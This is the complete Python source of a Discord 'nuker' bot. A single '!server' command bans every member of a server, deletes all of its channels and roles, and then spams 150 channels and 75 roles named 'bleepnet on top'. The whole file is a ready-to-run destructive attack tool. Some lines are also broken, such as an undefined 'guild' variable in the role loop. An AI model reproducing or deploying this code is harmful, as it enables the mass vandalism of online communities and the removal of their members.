import discord
from discord.ext import commands
from tasksio import TaskPool


intents = discord.Intents.all()
client = commands.Bot(command_prefix='!',
   case_insensitive=True, intents=intents)

@client.command()
async def server(ctx):
  async with TaskPool(5_000) as pool:
    for member in list(ctx.guild.members):
      try:
        await pool.put(await member.ban())
        print(f"Banned {member.display_name}")
      except Exception:
        pass

  async with TaskPool(5_000) as pool:
    for channel in list(ctx.guild.channels):
      try:
        await pool.put(await channel.delete())
        print(f"Deleted Channel: {channel.name}")
      except Exception:
        pass

  async with TaskPool(5_000) as pool:
    for role in list(ctx.guild.roles):
      try:
        await pool.put(await role.delete())
        print(f"Deleted Role: {role.name}")
      except Exception:
        pass
  async with TaskPool(5_000) as pool:
    for i in range(150):
      try:
        await pool.put(await ctx.guild.create_text_channel("bleepnet on top"))
        print(f"Created channel: bleepnet on top")
      except Exception:
        pass
  async with TaskPool(5_000) as pool:
    for i in range(75):
      try:
        await pool.put(await guild.create_role(name="bleepnet on top"))
        print(f"Created role: bleepnet on top")
      except Exception:
        pass

 
client.run("token")
